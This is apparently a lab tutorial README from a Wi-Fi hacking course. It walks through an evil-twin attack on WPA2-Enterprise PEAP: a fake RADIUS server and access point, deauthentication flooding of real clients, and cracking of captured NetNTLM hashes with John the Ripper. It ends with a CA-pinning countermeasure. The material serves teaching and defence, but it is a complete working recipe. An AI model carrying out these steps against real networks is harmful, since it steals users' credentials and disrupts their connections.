# TFG-Pentesting
## Introduction
Finally, it is time to put to the test one of the Wi-Fi security protocols considered to be among the most robust: the Enterprise version of WPA/WPA2. This is a protocol that replaces authentication through a pre-shared key with another method that uses a server to strengthen the authentication process. In addition, the usual methodology will be followed in order to carry out the relevant attacks and show the countermeasures or recommendations that may help stop them.

## WPA/WPA2 EAP Security Protocols
In the Enterprise version of these WPA and WPA2 protocols, a RADIUS server is used, which is now responsible for authenticating the different clients instead of the PSK:
![image](https://github.com/user-attachments/assets/cbfbf8f3-7533-4f6c-86ae-45293f0bef04)

The security of this type of protocol is mainly based on a secret known only to the legitimate user and the RADIUS server. This secret can take several forms (username and password, digital certificate, etc.) depending on the EAP Type. Depending on the chosen authentication type, the level of security will be higher or lower. In this study, the PEAP level is chosen, which consists of username-password authentication protected by TLS during communication for its verification. [[40](https://ieeexplore.ieee.org/abstract/document/8289808?casa_token=nGwDxRuO2XAAAAAA:X-DolgsMBTtaIVsijXXjFSRyvUGe1AJ6SJB6HROKB8tSaKYEWq8i5qklJglhlBGADXAoTGqOW24L)]

### Vulnerabilities
Some effective attacks against this type of system are:
- **KRACK:**  
  It allows the attacker to reinstall a key that has already been used, which can lead to the reuse of NONCES and, therefore, to the possibility of decrypting encrypted traffic. This attack works against both PSK and Enterprise versions, which makes it truly harmful. [[41](https://ieeexplore.ieee.org/document/10041548)]
- **Rogue AP:**  
  This is a type of attack that aims to steal authentication keys or a user's legitimate information by taking advantage of the trust that the user places in an access point they trust. More specifically, it attempts to impersonate the legitimate access point the user wants to connect to, making the user unable to distinguish it from the original. In doing so, it can obtain the access credentials when the user attempts to connect to it, or even continue pretending to be the legitimate access point in order to steal sensitive information from future communications. [[40](https://ieeexplore.ieee.org/abstract/document/8289808?casa_token=nGwDxRuO2XAAAAAA:X-DolgsMBTtaIVsijXXjFSRyvUGe1AJ6SJB6HROKB8tSaKYEWq8i5qklJglhlBGADXAoTGqOW24L)]

## Attacking WPA/WPA2
This section deals with one of the most difficult protocols to attack when it comes to exploiting a flaw in the protocol itself. Therefore, the attack that will be explained is based on a possible misconfiguration, which is typically the default configuration. Normally, a client that wants to connect to an access point with a RADIUS server does so using a certificate provided by that authentication server (this is similar to how a website uses HTTPS in order to begin authentication communication and "prove" that the server is legitimate).

Thus, the attack process will consist of creating fake access point and RADIUS server that offer a fake certificate to legitimate clients (those of the real access point). The server will then ask these clients for their credentials, which should be rejected. However, it is very common that, by default, these clients are configured to accept any certificate coming from an authentication server and then proceed with the authentication process (sending their credentials) to that server. This allows attackers to obtain valid credentials, with which they can connect to the legitimate access point by impersonating an authorized user.

To begin this attack process, the lab must be started (in this same branch) and the attacker machine launched:
```bash
sudo ./launch.sh
docker-compose exec attacker-1 bash
```
Now `airmon-ng` together with `airodump-ng` can be run in order to view the details of the network to be attacked and confirm that it is WPA/WPA2 in Enterprise mode. In addition, so as not to interfere with the behavior of the attacker's network interface that will later be used as the fake access point, monitor mode is disabled after this action:
```bash
airmon-ng start wlan4
airodump-ng wlan4mon
# Disable when it is no longer needed
airmon-ng stop wlan4mon
```
`Reminder:` The monitor-mode interface may keep the same name or become something like `wlan4mon`; it is advisable to verify this and the original interface name with `ifconfig`.
<img width="862" height="311" alt="image" src="https://github.com/user-attachments/assets/b0b8ac13-3dbf-43e0-aee8-77fc44f368ac" />
<img width="1020" height="191" alt="image" src="https://github.com/user-attachments/assets/04303785-cf20-48a1-8c40-10973bb1ec3f" />

`Note:` In this lab, two wireless interfaces are used on the attacker in order to use monitor mode (typically `wlan4`) and access-point mode (typically `wlan5`) simultaneously.

In this case, it can be seen that this is WPA2 Enterprise thanks to the `AUTH` field, which contains the value `MGT` (Management), that is, authentication managed by a server (in this case a RADIUS server). Once the type of protocol used by the access point is confirmed, a fake RADIUS server can be created (on the attacker machine), which will be used as the authentication server.

`Note:` The exact EAP authentication type is not yet known. It is assumed to be PEAP (username and password), although this can later be confirmed by trial and error or simply by analyzing the traffic from this first configuration if it is not the correct one (RADIUS will log the connection attempts in which the authentication type is defined).

First of all, `freeradius` would normally have to be installed (on Kali Linux, `freeradius-wpe`) in order to create the RADIUS server. However, this tool is already installed in the lab. Thus, the authentication server can now be configured, starting with the `clients.conf` file located in `/etc/freeradius`, which stores the configuration of the clients that can connect to this server and how they can do so. For our purpose, the following is enough:
```text
client 127.0.0.1 {   
    Secret  = malicious123
    Shortname = fake-radius
}
```
- `client <IP>:` range of IP addresses that may connect to the RADIUS server (we are only interested in the connection from the attacker machine itself, which will also act as the access point).
- `Secret:` pre-shared key between the client (the access point in our case) and the RADIUS server used to encrypt the messages exchanged.
- `Shortname:` symbolic identifier of the client (not especially important).
```bash
nano /etc/freeradius/clients.conf
```

`Note:` It is recommended to change the keys and names in order to correctly understand how it works, rather than limiting yourself to copy-paste, always applying the changes everywhere they appear.

Continuing with the RADIUS server configuration, the next file is `/etc/freeradius-wpe/3.0/mods-config/files/authorize` (or `/etc/freeradius/users` depending on the version), which contains the credentials of the users authorized to connect to the WPA/WPA2 access point that will be created later (in this case, the attacker’s fake access point). Here it is enough to add any user that allows us to test that the server works correctly:
```text
# Add a user of the following type to the file:
# Format: "<username>"	Cleartext-Password := "<password>"
"carlos"	Cleartext-Password := "test"
```
<img width="525" height="160" alt="image" src="https://github.com/user-attachments/assets/a90e9c9c-5c28-4fc2-893b-9977e54a3c7f" />

This is because we are not trying to get legitimate users to connect successfully to our access point; instead, we want to capture the information required to obtain valid credentials for another access point. The idea is that when those target credentials fail, the necessary data (`Challenge` and its corresponding `Response`) will be logged so they can later be cracked with a brute-force attack.

On the other hand, the file `/etc/freeradius-wpe/3.0/mods-available/eap` (or `eap.conf` depending on the version of `freeradius`) must be checked to ensure that the authentication type (EAP Type) is correctly configured, that is, `PEAP` (username and password transmitted through a TLS tunnel):
```text
eap {
  	# ...
  	default_eap_type = peap
  	timer_expire = 60
    # ...
}
```
- `default_eap_type:` default EAP Type that the RADIUS server will adopt.
<img width="530" height="159" alt="image" src="https://github.com/user-attachments/assets/6d21b8ae-40b2-4bc4-9dbd-9d2557de78bc" />

In addition, within this same file, the range of accepted TLS versions must be widened, because if clients do not accept the same preconfigured versions (normally only 1.2 is accepted), the communication will not be able to continue and therefore the attack will fail:
```text
eap {
    # ...
	  tls-config tls-common {
        # ...
        tls_min_version = "1.0"
		    tls_max_version = "1.3"
        # ...
    }
    # ...
}
```
- `tls_min_version:` minimum TLS version accepted by freeradius-wpe.
- `tls_max_version:` maximum TLS version accepted by freeradius-wpe.
<img width="589" height="210" alt="image" src="https://github.com/user-attachments/assets/d3585e80-18b3-4d70-b2ff-eff52e445338" />

Now it is time to define the configuration required to log authentication attempts, both failed and successful. This is done in order to obtain the data needed later for cracking credentials, as mentioned earlier. Again, a configuration similar to the following must be checked in `radius.conf` (also located in `/etc/freeradius-wpe/3.0`):
```text
log {
    # ...
    auth = yes
  	auth_badpass = yes
  	auth_goodpass = yes
    # ...
}
```
- `auth = yes`: saves both failed authentication attempts (`Access-Reject`) and successful ones (`Access-Accept`) in the log.
- `auth_badpass = yes`: stores the passwords from failed authentication attempts in the log.
- `auth_goodpass = yes`: stores the passwords from successful authentication attempts in the log.
<img width="695" height="674" alt="image" src="https://github.com/user-attachments/assets/0b8a9e2d-b950-4ec3-9fda-c1364fca4a5c" />

This completes the entire configuration of the RADIUS server that will be launched on the attacker’s `localhost` in order to manage authentication for the fake access point based on WPA/WPA2 Enterprise that will be created next. At this point, the RADIUS server can already be started:
```bash
freeradius-wpe -i 127.0.0.1 -p 1812 
```
* `-i:` IP on which the RADIUS server listens.
* `-p:` port on which the RADIUS server listens (by default this is usually 1812).
* `-X:` optional, to run in the foreground.

Moving on to the access point configuration, the first step is to set the IP address of the access point for the users who connect to it, as well as the DHCP configuration that will later distribute IP addresses among those connected users (a different subnet is used in order to verify which access point we are connected to):
```bash
# Access point IP (for its wireless interface)
ip addr add 10.5.2.193/26 dev wlan5
```
`Note:` Check with `ifconfig` that the attacker interface is `wlan4` and change the command to the real name if necessary.

```text
# DHCP configuration stored in /etc/dhcp/dhcpd.conf
ddns-update-style interim;
ignore client-updates;
authoritative;

subnet 10.5.2.192 netmask 255.255.255.192 {
    range  10.5.2.194 10.5.2.254;   				                    # Range of IPs (10.5.2.192/26) that will be assigned to connected users
    option subnet-mask 255.255.255.192;    			                # Subnet mask that connected users will use
    option broadcast-address 10.5.2.255;  			                # Broadcast address used by connected users
    option routers 10.5.2.193;         				                  # Default gateway used by connected users (access point IP)
    option domain-name-servers 10.5.2.193, 8.8.8.8, 8.8.4.4;  	# Default DNS IPs used by connected users

    default-lease-time 21600;    				                        # Time in seconds until each connected user's current IP expires
    max-lease-time 43200;
}
```
```bash
# Example of how to edit and/or create it
nano /etc/dhcp/dhcpd.conf
```

With this configuration in place, the DHCP service can now be started using:
```bash
# Kill previous DHCP process
pkill dhcpd
# Configure files required for DHCP 
touch /var/lib/dhcp/dhcpd.leases
chown root:root /var/lib/dhcp/dhcpd.leases
# Start DHCP service
dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
```
* `-cf /etc/dhcp/dhcpd.conf:` location of the DHCP configuration file (in this case it could be omitted because it is in the default location).
* `wlan4:` interface on which the DHCP service will be started (the interface that will act as the access point).

On the other hand, it would be advisable to provide Internet access to the clients that connect, although this is neither necessary nor possible here due to the lack of a wired interface connected to the Internet on the attacker machine. This could be done using `iptables` rules (firewall rules in Linux environments) similar to the following (these are the ones used in the configuration of the legitimate access point):
```bash
# Allow packets to pass through
echo 1 > /proc/sys/net/ipv4/ip_forward

# Drop all forwarded traffic by default
iptables -P FORWARD DROP

# Allow only traffic through the created WLAN
iptables -A FORWARD -i wlan5 -o wlan5 -s 10.5.2.193/26 -d 10.5.2.193/26 -j ACCEPT

# Allow only traffic from the wireless network to the wired one (and masquerade it)
iptables -A FORWARD -s 10.5.2.193/26 -i wlan5 -o eth0 -j ACCEPT
iptables -A FORWARD -d 10.5.2.193/26 -i eth0 -o wlan5 -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.5.2.193/26 -o eth0 -j SNAT --to 10.5.2.24

# Allow loopback traffic
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
```
This could help avoid detection if, for every failed attempt, user credentials are registered in `/etc/freeradius/users`, which would later make it easy to carry out a MITM attack by taking advantage of the fact that the normal communication is already passing through our access point. This kind of attack, which will be detailed in the next chapter, consists of imitating a legitimate access point to steal or modify the information flowing through it.

With all this configured, all that remains is to define the access point through the `hostapd` tool (already installed on the attacker machine), which has been used throughout the lab to configure the different Wi-Fi access points with their respective protocol differences. For this purpose, the following `hostapd.conf` configuration file is used:
```text
# WPA2 configuration
interface=wlan5
ssid=WPA-EAPnetwork
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# RADIUS authentication configuration
ieee8021x=1
eapol_version=1
eap_message="Welcome to the attacker's network"
eap_reauth_period=3600

# If this file is copy-pasted, it is recommended to remove the following
# comments so the tool works correctly
own_ip_addr=10.5.2.193                      # Access point IP
nas_identifier=carlos.in                    # Symbolic identifier (not very important)
auth_server_addr=127.0.0.1                  # RADIUS server IP
auth_server_port=1812                       # RADIUS server port
auth_server_shared_secret=malicious123      # Shared secret with RADIUS (clients.conf)
```

Finally, the `hostapd` tool is launched to finish configuring the fake access point that will use RADIUS as an authentication server:
```bash
pkill hostapd    # Kill previous hostapd process
hostapd hostapd.conf -B
```
* `hostapd.conf:` configuration file defining the access point details.
* `-B:` run in the background.

After this, it is advisable to test that the RADIUS server and the corresponding access point it authenticates have been created successfully. To do so, the user "carlos" with password "test" was created in `authorize`, so it is only necessary to connect with those credentials and verify that a valid IP is obtained within the DHCP-defined range. This can be done with `wpa_supplicant`, the tool that has been used throughout the construction of the lab to connect to the different created access points. First, the existence of the new access point is checked with `airodump-ng`:
```bash
airodump-ng wlan4mon
# Disable when it is no longer needed
airmon-ng stop wlan4mon
```
<img width="1007" height="286" alt="image" src="https://github.com/user-attachments/assets/ad6765bd-6999-4793-8fe5-1a63f920404d" />

When two access points with the same `SSID` (but different MAC addresses) are seen, a connection attempt is made from the secondary network interface that the attacker now has, `wlan4` (after stopping monitor mode, because the goal is to connect, not to listen to every message in range). To do so, the following `wpa_supplicant.conf` is created (it is already present on the attacker machine):
```bash
# Example of how to view or modify the content
# (modify it if the credentials were changed)
nano wpa_supplicant.conf
```
```text
# Content of wpa_supplicant.conf
# This file can also be used directly for testing
network={
    ssid="WPA-EAPnetwork"
	# The attacker AP MAC is specified to ensure connection to it
    bssid=02:00:00:00:05:00
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="carlos"
    password="test"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```

After that, the tool is run in the background so that it continuously attempts to connect:
```bash
pkill wpa_supplicant    # Kill previous wpa_supplicant process
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
```
* `-i:` interface used for the connection.
* `-c:` location of the configuration file defining the access credentials.
* `-B:` run in the background.

Once authentication has taken place (if successful), the `dhclient` tool can be used to request a valid IP from the DHCP server running on the machine acting as the access point (the attacker machine in this case):
```bash
# Change the interface depending on which client is used
dhclient wlan4
```
<img width="721" height="819" alt="image" src="https://github.com/user-attachments/assets/2b4d1995-4647-4e32-b544-fd52499db89c" />

`Note:` All the configuration files described up to this point are located inside the attacker machine in `/ap`, so simply copying them to their respective locations would configure everything correctly. However, performing the configuration manually is strongly recommended, as well as studying the rest of the parameters in the different files in order to better understand how both the attack and a RADIUS server or a wireless connection through `hostapd` and `wpa_supplicant` work, since these tools were used in building the wireless lab environment.

Here it can be seen how the attacker interface acting as a client (`wlan4`) successfully connects to the access point created on another interface of the same machine (`wlan5`), as it obtains an IP in the range assigned by its DHCP service (`10.5.2.192/26`). On the other hand, `/var/log/freeradius-wpe/radius.log` and `/var/log/freeradius-wpe/freeradius-server-wpe.log` can be checked for more details on whether the connection attempt was accepted by the RADIUS server:
```bash
cat /var/log/freeradius-wpe/radius.log
cat var/log/freeradius-wpe/freeradius-server-wpe.log 
```
<img width="1450" height="646" alt="image" src="https://github.com/user-attachments/assets/624db0ca-8eaa-4003-b429-816d48cc2f4d" />

`Note:` It is advisable to observe what happens if a connection attempt is made with a password or user that is not registered, in order to better understand how an access point with RADIUS as authentication server works.

```bash
pkill wpa_supplicant    # Kill previous wpa_supplicant process
nano wpa_supplicant.conf  
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
cat /var/log/freeradius-wpe/radius.log
# This is the one that is truly interesting for the attack
cat /var/log/freeradius-wpe/freeradius-server-wpe.log 
```

Once it is verified that everything works correctly, it is time to obtain the credentials of the clients connected to the legitimate access point. To do so, the idea is to take advantage of the fact that they will be configured to connect to an access point with `SSID` equal to `WPA-EAPnetwork`. However, it is very likely that they do not have the exact `MAC` of the legitimate device configured, nor any other setting that would allow them to unequivocally identify the legitimate device from a fake one with the same `SSID`. This is where the importance of keeping an identical `SSID` on the fake access point comes in: it becomes enough to force the legitimate clients to disconnect from the real device so that one of them may connect to the fake one:
```bash
# In another terminal (force channel for aireplay)
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng -c 6 wlan4mon
# In another terminal 
docker-compose exec attacker-1 bash
aireplay-ng -0 1000 -a 02:00:00:00:00:00 wlan4mon
```
- `-0`: deauthentication (attack that forces deauthentications).
- `1000`: number of deauthentication messages sent (a high value to ensure disconnection for long enough that clients connect to the fake AP).
- `-a 02:00:00:00:00:00`: MAC address of the access point.
- `-c 02:00:00:00:02:00`: MAC address of the client to deauthenticate (optional, since in this case it is better to target all of them).
- `wlan4`: name of the interface used.
<img width="793" height="489" alt="image" src="https://github.com/user-attachments/assets/ce3a25f0-14c4-4de4-bfbe-748ce5c3b2ec" />
<img width="949" height="375" alt="image" src="https://github.com/user-attachments/assets/c14a3384-f439-4ab0-89fb-28a183fa85f2" />

`Note:` This attack can also be carried out in a less intrusive way (without forcing disconnections) in order to reduce the risk of detection. This could be done by taking advantage of the typical automatic connection configuration to known access points once the victim (any user) is out of range of the legitimate device. On the other hand, signal-strength-related techniques could also be used, making the victim prefer the device with the stronger signal. However, in this lab it is better to force the legitimate device’s disconnection because there is no signal-power difference in a simulation, although it is possible and advisable to stop the legitimate access point to simulate the first proposed case.

After this, it is enough to inspect `/var/log/freeradius-wpe/freeradius-server-wpe.log` to view the `challenge` (random number sent by the RADIUS server to the client) and the `challenge response` (hash created with the user’s password and that challenge, which is used to verify identity securely) that will later allow the real passwords to be obtained through a cracking process:
```bash
cat /var/log/freeradius-wpe/freeradius-server-wpe.log 
```
<img width="1069" height="677" alt="image" src="https://github.com/user-attachments/assets/d6308ee6-2ef7-4460-b444-89879c43dd8a" />

Here, both the username and the mentioned pieces of interest can be seen. With all this, it is possible to generate a hash in the form that appears after `john NETNTLM:`, which represents a string ready to be cracked by [`John the Ripper`](https://www.openwall.com/john/), one of the most famous cracking tools (it can also be seen how it can easily be built from the rest of the data if that string is not provided directly). Thus, a file `hashes.txt` can be created containing these strings in order to feed it to `john`:
```bash
nano hashes.txt
```
```text
# Content of hashes.txt
carlos:$NETNTLM$84b2be27eb7aadc3$50da229024b40a9ac203be9e8bba06c7095692ce92799803
client1:$NETNTLM$92634e7820125b63$628b402f255260eda1d4b9fb95937163c49cfc968f53ef5d
client2:$NETNTLM$1fff09f40a612c88$a2adb54c1af413a7e8164295a7e8462443f6c5030672d426
client3:$NETNTLM$279ed68695cdff89$20f8792e8ed7387b48ec8e442b180e66fcdc05866444407d
```

With this, together with a possible password dictionary such as the one used in the [`WPA/WPA2-PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-PSK) chapter, `/usr/share/wordlists/rockyou.txt`, the cracking tool can be launched to obtain the real passwords of the captured users:
```bash
# Launch the tool
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlm hashes.txt
```
* **--wordlist=/usr/share/wordlists/rockyou.txt:** test dictionary.
* **--format=netntlm:** format of the string composing the hash (in this case it can be clearly seen in the RADIUS log).
* **hashes.txt:** file containing the hashes to be cracked.
<img width="1090" height="311" alt="image" src="https://github.com/user-attachments/assets/1c34be03-7017-4f07-a70f-380a3c4977b1" />

This yields the passwords, making it possible to connect to the legitimate device using them. Finally, it is recommended to investigate how to modify `wpa_supplicant.conf` on the attacker in order to connect to the legitimate access point with `wlan4` using any of the legitimate users’ credentials.
<img width="712" height="792" alt="image" src="https://github.com/user-attachments/assets/fef0146f-b265-4bd5-ae49-6f29b0268e0f" />

`Reminder:` It is also advisable to repeat the [attacks](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks) performed after gaining access with the configuration of this chapter in order to see that, once inside, the security chosen on the access point becomes irrelevant, thus allowing the same results.

### Countermeasures and recommendations
The best way to stop this kind of attack is to review both the client devices and the device acting as the access point, so that their configurations are correctly adjusted rather than relying on default settings. Such strong authentication is useless if small details are left in place that lead to attacks like the one just shown. Therefore, the ideal approach is to properly adjust configurations such as accepting only certificates signed by a Certification Authority (`CA`), instead of accepting any certificate. This makes it possible to identify the legitimate access point unequivocally, thus avoiding connections to fake access points that aim to steal our credentials. In addition, it may also be worthwhile to add similar protections on the access point side to prevent connections from invalid clients.

`Note:` Other measures such as connecting only to a specific MAC address may be somewhat weak, since there are tools such as `macchanger` that allow this parameter to be changed on an attacker device.

To demonstrate the potential of these actions, the attack will be repeated after making a few adjustments so that the clients use `wpa_supplicant` configured to connect only to the legitimate access point. To do this, `wpa_supplicant.conf` is modified so that it accepts only certificates signed with the `CA` used by the legitimate RADIUS server (this can be found and copied from `/etc/freeradius/certs/ca.pem` on the clients):
```text
network={
    ssid="WPA-EAPnetwork"
	# Use of the CA certificate
    ca_cert="/etc/ssl/certs/ca.pem"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="client3"
    password="EAPpassw0rd3"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```

For this to work correctly, it is advisable to restart the lab and repeat the attack, but not before applying the secure `wpa_supplicant` configurations on the clients (`client-1`, `client-2`, and `client-3`). To do so, go to [`Dockerfile client12`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-RADIUS/internal/wireless/client12/Dockerfile) for `client-1` and `client-2`, as well as [`Dockerfile client3`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-RADIUS/internal/wireless/client3/Dockerfile) for `client-3`, commenting out the original `wpa_supplicant.conf` configurations and uncommenting those ending in `secure`:
<img width="680" height="163" alt="image" src="https://github.com/user-attachments/assets/aad38a2b-3b13-4baf-b7cf-abe1f4c89d04" />
<img width="575" height="113" alt="image" src="https://github.com/user-attachments/assets/ae4ec66f-ba21-4bf0-b3a4-d64540ffd61e" />

Once this is done, the lab and the attack are launched again, following the previous steps (it is advisable to uncomment in [`attacker Dockerfile`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/WPA/WPA2-RADIUS/internal/wireless/attacker/Dockerfile) the `COPY` instructions that directly copy the `freeradius-wpe` configuration into the location it expects):
```bash
# Launch fake AP and fake RADIUS
freeradius-wpe -i 127.0.0.1 -p 1812
# Access point IP (wireless interface)
ip addr add 10.5.2.193/26 dev wlan5
# Kill previous DHCP process
pkill dhcpd
# Configure files required for DHCP 
touch /var/lib/dhcp/dhcpd.leases
chown root:root /var/lib/dhcp/dhcpd.leases
# Launch DHCP service
dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
pkill hostapd    # Kill previous hostapd process
hostapd hostapd.conf -B

# Force disconnection of legitimate clients
# In another terminal (force channel for aireplay)
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng -c 6 wlan4mon
# In another terminal 
docker-compose exec attacker-1 bash
aireplay-ng -0 1000 -a 02:00:00:00:00:00 wlan4mon

# Check captured hashes (there should be none)
cat /var/log/freeradius-wpe/freeradius-server-wpe.log
```
<img width="940" height="296" alt="image" src="https://github.com/user-attachments/assets/1f42fc2d-dec0-4e2f-abb5-0980287ea3dc" />

<img width="909" height="441" alt="image" src="https://github.com/user-attachments/assets/33004885-cfd8-4c4f-b1db-3eb874d1544c" />

<img width="806" height="826" alt="image" src="https://github.com/user-attachments/assets/f14dafd0-3d20-4e55-ba53-9e43ba51e7f7" />

This shows a first configuration that would add security; however, it could be reinforced even further by including the certificate or a hash that represents only the legitimate RADIUS server.

[`Previous lesson, cracking WPS networks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPS)
[`Next lesson, extra chapter: WPA3 and RogueAP`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/RougeAP)
